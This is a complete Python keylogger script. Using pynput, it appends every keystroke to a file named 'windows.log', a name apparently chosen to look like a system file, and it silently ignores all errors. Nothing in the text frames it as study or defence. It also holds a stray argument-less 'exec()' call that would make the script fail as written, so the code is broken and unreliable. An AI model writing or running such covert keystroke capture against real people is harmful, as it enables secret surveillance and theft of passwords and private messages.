from pynput import keyboard
import os
import datetime

prev = datetime.datetime.now()

exec()


def on_key_press(key):
    global prev
    curr = datetime.datetime.now()
    if key == keyboard.Key.enter:
        text = r"\n"
    elif key == keyboard.Key.tab:
        text = r"\t"
    elif key == keyboard.Key.space:
        text = " "
    elif key == keyboard.Key.backspace:
        text = r"\b"
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
        text = r"alt"
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        text = r"\ctrl"
    elif key in [
        keyboard.Key.right,
        keyboard.Key.left,
        keyboard.Key.up,
        keyboard.Key.down,
    ]:
        text = ""
    else:
        text = str(key).strip("'")
    with open(log_file, "a") as f:
        if prev + datetime.timedelta(seconds=10) < curr:
            timestamp = datetime.datetime.now().strftime(r"%Y-%m-%d %H:%M:%S")
            text = f"\n {timestamp}: " + text
        f.write(text)
    prev = curr


log_file = "windows.log"
try:
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()
except:
    pass
